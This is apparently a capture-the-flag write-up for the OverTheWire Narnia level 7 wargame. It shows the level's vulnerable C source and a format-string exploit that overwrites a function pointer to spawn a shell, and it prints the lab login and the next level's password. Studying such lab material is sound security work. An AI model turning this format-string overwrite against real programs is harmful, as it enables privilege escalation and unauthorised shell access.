## Login 

` SSH : ssh narnia7@narnia.labs.overthewire.org -p 2226 `
` Pass : 54RtepCEU0 `

## Solution

First, let’s try to execute the program…

```
$ ssh narnia7@narnia.labs.overthewire.org -p 2226

cd /narnia/
narnia7@narnia:/narnia$ ./narnia7
Usage: ./narnia7 <buffer>
narnia7@narnia:/narnia$ ./narnia7 test
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd648)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```

Looks like we need to redirect the execution flow somehow…
### Source Code

Let’s check the source.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	    fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

When we execute the program, we land ont the _goodfunction()_ but the program want us to execute the _hackedfunction()_. If we take a close look, we can see there is a _format string_ vulnerability in the _snprintf()_ function.

```
$ ./narnia7 ABCD
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd638)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```

So, according to the program, we need to modify **prtf** with the address of _hackedfunction()_ (`0x8048724`). To do that we need to write `0x8048724` at `0xffffd638` (_prtf()_). Since we don’t really know where our input is placed on the stack, we’ll just brutforce the position. Note that the value we’ll write will be **134514464** (`134514468 (or 0x8048724) - 4 = 134514464`)

```
narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x38\xd6\xff\xff" + "%134514464d%1$n"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd638)
I guess you want to come to the hackedfunction...
Segmentation fault
# Nope...

narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x38\xd6\xff\xff" + "%134514464d%2$n"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd638)
I guess you want to come to the hackedfunction...
Way to go!!!!$
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
i1SQ81fkb8
```

On the second try !